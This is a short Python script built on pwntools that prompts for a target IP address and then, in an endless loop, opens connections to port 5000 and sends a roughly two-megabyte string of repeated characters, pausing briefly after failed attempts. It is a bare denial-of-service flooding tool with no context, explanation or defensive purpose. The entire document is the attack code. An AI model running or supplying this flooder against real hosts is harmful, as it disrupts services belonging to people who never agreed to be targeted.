print("importing and prepping")
from pwn import *
from time import sleep
verylargestring = bytes("0" * 1000000, "utf-16")
print("done")
ip = input("ip:")
print("sending packets")
i = 0
while True:
    try:
        p = remote(ip, 5000)
        p.send(verylargestring)
        p.close()
    except:
        sleep(1)